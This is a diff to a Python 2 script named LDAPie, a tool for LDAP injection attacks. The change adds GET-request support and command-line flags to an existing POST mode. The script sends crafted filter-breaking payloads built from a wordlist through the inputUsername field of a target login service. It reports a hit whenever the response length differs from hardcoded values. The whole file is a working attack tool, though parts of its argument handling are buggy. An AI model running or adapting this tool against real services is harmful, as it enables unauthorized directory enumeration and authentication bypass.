@@ -1,4 +1,4 @@
-#/usr/bin/python2
+#/usr/bin/env python2
 #Title: LDAPie
 #Author: Tepidangler
 #Date: Today
@@ -8,10 +8,11 @@
 
 # importing the modules we'll need
 
-import requests, sys
+import requests, sys, time
+import argparse as ap
 
 #Let's make things look a little bit better and easier for people to use
-print("""\033[2;36m Usage: python LDAPie.py <wordlist> <url>
+print("""\033[1;36m
 #####################################################
 	 Welcome to LDAPie by Tepidangler
 	 Email: tepidangler@protonmail.com
@@ -19,46 +20,99 @@ print("""\033[2;36m Usage: python LDAPie.py <wordlist> <url>
                necessity since I couldn't find a
 	       program that did LDAP injection
                via POST requests
-         TODO: Add GET requests, add switches,
-               loosen up request params, automate
+         TODO: loosen up request params, automate
+               IF URL IS NOT SET YOU WILL GET FALSE NEGATIVES :)
 #####################################################
+USAGE: python LDAPie.py <opts> <get/post> <url> 
+-h for help
 """)
 
 # making our class
 
-class Ldapie:
+class LDAPie:
 
 #Initialize the program
-    def __init__(self,filename,url):
-        self.filename = filename
+    def __init__(self,wordlist,url):
+        self.wordlist = wordlist
         self.url = url
+
 #Function to take the file from sys args, read them, then we'll use that to build our request
+    def post(self,wordlist,url):
 
-    def count(self,filename):
-        with open(filename, 'r') as f:
-            for i, l in enumerate(f):
-                pass
-        return i + 1
-
-    def req(self,filename,url):
-
-        with open(filename, 'r') as f:
+        with open(wordlist, 'r') as f:
             a = f.read().splitlines()
             for x in a:
                 data = {'inputUsername':'ldapuser)('+x+'=*))(&'+x+'=void)'}
-                r = requests.post(url,data=data)
+                h = {'Connection':'Close'}
+                time.sleep(5)
+                r = requests.post(url,headers=h,data=data)
                 l = r.text
                 if len(l) not in [2810,2822]:
-                    print("\033[1;32mVALID LDAP INJECTION: "+data)
+                    print("\033[1;32mVALID LDAP INJECTION: "+str(data))
             pass
 
-
-
+    def get(self,wordlist,url):
+        with open(wordlist, 'r') as f:
+            a = f.read().splitlines()
+            for x in a:
+                url = sys.argv[5]+'/?inputUsername=ldapuser)('+x+'=*))(&'+x+'=void)'
+                r = requests.get(url)
+                l = r.text
+                print(url)
+                if len(l) not in [1,2]:
+                   print("\033[1;32mVALID LDAP INJECTION: "+url)
 #main
-if len(sys.argv) > 2:
-    m = Ldapie(sys.argv[1],sys.argv[2])
-    d = m.req(sys.argv[1],sys.argv[2])
-else:
-    print("""\033[1;31mPLEASE PROVIDE WITH SOME ARGUMENTS
-Usage: python LDAPie.py <wordlist> <url>
-\n""")
+#SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
+post = False
+get = False
+wordlist = None
+url = None
+
+arg_index = 0
+for arg in sys.argv:
+    if (arg == "-h"):
+        print("""
+-w                      path/to/wordlist 
+-u                      path/to/vuln/service 
+-p                      post/-g get 
+-h                      help
+""")
+        sys.exit(0)
+    elif (arg == "-w"):
+        wordlist = sys.argv[arg_index + 1]
+    elif (arg == "-u"):
+        url = sys.argv[arg_index + 1]
+    elif (arg == "-p"):
+        post = True
+    elif (arg == "-g"):
+        get = True
+    arg_index = arg_index + 1
+
+m = LDAPie(wordlist,url)
+if post == True:
+#    print('here')
+    p = m.post(wordlist,url)
+#    print('here')
+    pass
+if get == True:
+    g = m.get(wordlist,url)
+    pass
+#        print("\033[1;31mPLEASE SPECIFY GET OR POST USING THE G OR P FLAGS""")
+
+elif get == False or post == False:
+    print("""\033;1;32m
+
+-w                      path/to/wordlist 
+-u                      path/to/vuln/service 
+-p                      post/-g get 
+-h                      help
+""")
+elif wordlist == None or url == None:
+    print("""\033;1;32m
+
+-w                      path/to/wordlist 
+-u                      path/to/vuln/service 
+-p                      post/-g get 
+-h                      help
+""")
+
